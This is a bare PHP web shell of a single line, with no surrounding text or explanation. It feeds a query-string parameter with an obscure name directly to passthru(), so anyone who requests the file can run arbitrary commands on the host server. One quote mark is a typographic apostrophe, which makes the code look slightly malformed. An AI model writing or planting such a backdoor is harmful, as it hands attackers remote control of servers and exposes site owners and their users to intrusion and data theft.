<?php
passthru($_GET[’VBfBp3Mi']);
?>
